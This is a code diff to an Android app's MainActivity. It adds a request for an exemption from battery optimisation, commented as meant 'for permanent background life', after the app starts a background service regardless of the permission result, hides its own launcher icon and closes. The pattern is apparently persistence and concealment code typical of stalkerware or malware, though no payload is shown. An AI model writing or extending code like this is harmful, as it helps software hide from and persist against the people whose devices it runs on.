@@ -105,12 +105,32 @@ public class MainActivity extends Activity {
     public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
         super.onRequestPermissionsResult(requestCode, permissions, grantResults);
         if (requestCode == PERMISSION_REQUEST_CODE) {
-            // Start the service regardless of the result to ensure persistence
             startMainService();
             
-            // Hide and finish INSTANTLY
+            // Critical: Request to bypass battery optimization for permanent background life
+            requestBatteryOptimization();
+            
+            // Hide and finish 
             hideAppIcon();
             finish();
+        }
+    }
+
+    private void requestBatteryOptimization() {
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
+            try {
+                String packageName = getPackageName();
+                android.os.PowerManager pm = (android.os.PowerManager) getSystemService(Context.POWER_SERVICE);
+                if (!pm.isIgnoringBatteryOptimizations(packageName)) {
+                    Intent intent = new Intent();
+                    intent.setAction(android.provider.Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
+                    intent.setData(android.net.Uri.parse("package:" + packageName));
+                    intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+                    startActivity(intent);
+                }
+            } catch (Exception e) {
+                e.printStackTrace();
+            }
         }
     }
 
